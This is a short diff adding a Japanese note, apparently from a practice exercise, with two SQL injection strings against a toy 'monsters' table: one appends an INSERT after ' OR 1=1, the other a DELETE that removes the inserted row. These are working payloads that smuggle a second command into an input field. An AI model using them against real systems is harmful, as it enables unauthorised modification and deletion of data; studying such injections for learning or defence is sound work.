@@ -1,0 +1,5 @@
+■データを追加する
+' OR 1=1; insert into monsters values(231,'謎モンスター','Riddle','なぞ',null,null,null);--
+
+■追加したデータを削除する
+' OR 1=1; delete from monsters where no=231;--
